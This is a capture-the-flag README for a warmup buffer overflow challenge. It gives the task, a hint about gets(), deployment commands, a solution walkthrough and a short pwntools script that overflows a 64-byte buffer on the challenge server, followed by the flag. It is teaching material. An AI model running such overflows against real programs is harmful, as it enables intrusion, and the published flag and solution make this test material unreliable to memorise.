# Varied Fun

Difficulty Level: Warmup
 
It is time to learn about [Buffer Overflow](https://ctf101.org/binary-exploitation/buffer-overflow/).  Overwrite ***target*** to get the flag
 
Connect via `nc challenge.ctf-fun.xyz 14004`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- [gets](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm) is a very dangerous function because it doesn't check for input length. Try giving an input longer than the length of buffer 
P.S `buffer[64]` = buffer has a length of 64



## Deployment

```bash
cd service
sudo ./variedfun.sh &
```

## Solution

When we look at the source code we see that target is initialized before buffer which makes target right above buffer.

![image2](../screenshots/variedfun/image2.png?raw=true "Image 2")

When input is being sent into buffer through gets, it grows upwards

![image4](../screenshots/variedfun/image4.png?raw=true "Image 4")
![image3](../screenshots/variedfun/image3.png?raw=true "Image 3")

Until eventually, when all 64 characters of space is filled, it will overwrite target thus changing the value of target

![image5](../screenshots/variedfun/image5.png?raw=true "Image 5")

```python
"""
Provide a buffer longer than 64 bytes and we win!
"""

from pwn import *

#sh = process('./variedfun')
sh = remote("challenge.ctf-fun.xyz", 14004)

payload = b"A" * 64 + b"B"

sh.sendline(payload)
sh.interactive()
```
### Flag
19C4{Im_1337_hakkerman_lmao}